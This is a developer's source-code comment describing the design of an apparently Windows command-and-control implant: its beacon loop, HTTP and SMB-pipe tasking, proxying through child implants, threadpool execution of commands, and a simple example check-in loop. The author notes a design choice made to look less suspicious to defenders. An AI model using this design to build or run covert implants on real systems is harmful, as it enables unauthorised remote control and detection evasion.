/* <clean me up>
==========================================================================================
The big: "How the fuck does this work" block of text to save anyone reading this some pain.
I promise it's simpler than it looks. I've done my best to comment just about everywhere
something could be ambigious/there's a reason to comment.

TLDR: Windows Async + OS ThreadPools. The code is NOT sequential.
The main loop never executes commands directly; it only moves tasks to where they need to go.
==========================================================================================

1. THE HEARTBEAT/BEACON/CHECKIN (cycle)
   The main thread sits in `cycle()` as a non-blocking state machine. Instead of standard
   sleeps, it uses `WaitForMultipleObjects` or `WaitForSingleObject`. It waits for one of
   two things to happen:
   A) A timeout/Pipe signal triggers -> Time to fetch new tasks (Ingress).
   B) The `h_data_ready_event` triggers -> A worker finished a task (Egress).

2. INGRESS & FETCHING
   Depending on the transport, data arrives via polling (HTTP) or async kernel signals
   (Named Pipes/SMB). The data is parsed from MsgPack into a JSON array and passed
   to the task handler: `handle_tasks()`.

3. TASK HANDLER (handle_tasks)
   For each task in the task array from the server, we look at the `implant_uuid`.
   - Is it OUR UUID? Send it to `dispatch_to_threadpool` (Local execution).
   - Is it a CHILD'S UUID/NOT OUR UUID? Send it to `dispatch_to_child_router` (SMB Proxying).
   The task is copied to the heap, and handed to the Windows OS Threadpool.

4. ASYNC EXECUTION (The Threadpool)
   The main loop immediately goes back to waiting/listening. Meanwhile, background
   OS threads do the heavy lifting.
   - Local: `TaskHandler` runs the `command_tree` (ls, whoami, BOFs, in commandtree.cpp)
   - Proxy: `ChildRoutingHandler` opens an SMB pipe to a child, sends the task, and
	 waits for the child to reply. This *does* block that thraed, but it's a BG task so
	 it doesn't stop our main thread.

5. THE HANDOFF & EGRESS
   Once a background worker gets a result, it locks the `queue_mutex`, shoves
   the result into `response_queue`, and fires `SetEvent(h_data_ready_event)`.

   This physically wakes up the main `cycle()` loop. The main loop drains the queue,
   batches everything into a single MsgPack payload, and yeets it back to the server via the
   current active `current_egress_` transport.
==========================================================================================

Dev Note:
This architecture is built to be as modular and self-contained as possible.
The command_tree (and other execution functions) have absolutely no idea they
are running asynchronously, nor do they care.

If you want to rip out the ThreadPool, re-write the logic, or just debug
a new command without the async overhead, you totally can. I implemented this
as an OS thread pool cuz it seemed cool & is less sus than CreateThread all over.

Example of a synchronous "cycle" function:
(notice how simple this is lol)

while (true) {
	// Fetch task array
	nlohmann::json inbound_task_array = current_ingress_->fetch_task(implant_uuid_);

	for (const auto& task : inbound_task_array) {
		// Execute task
		nlohmann::json task_results = command_tree(task_data);

		//optional... check if uuid is ours or not...

		// 3. Pack & Send
		std::vector<uint8_t> packed = nlohmann::json::to_msgpack(task_results);
		current_egress_->send_response(implant_uuid_, packed);

		//you could sleep here too
	}

	// Sleep
	Sleep(5000);
}
*/

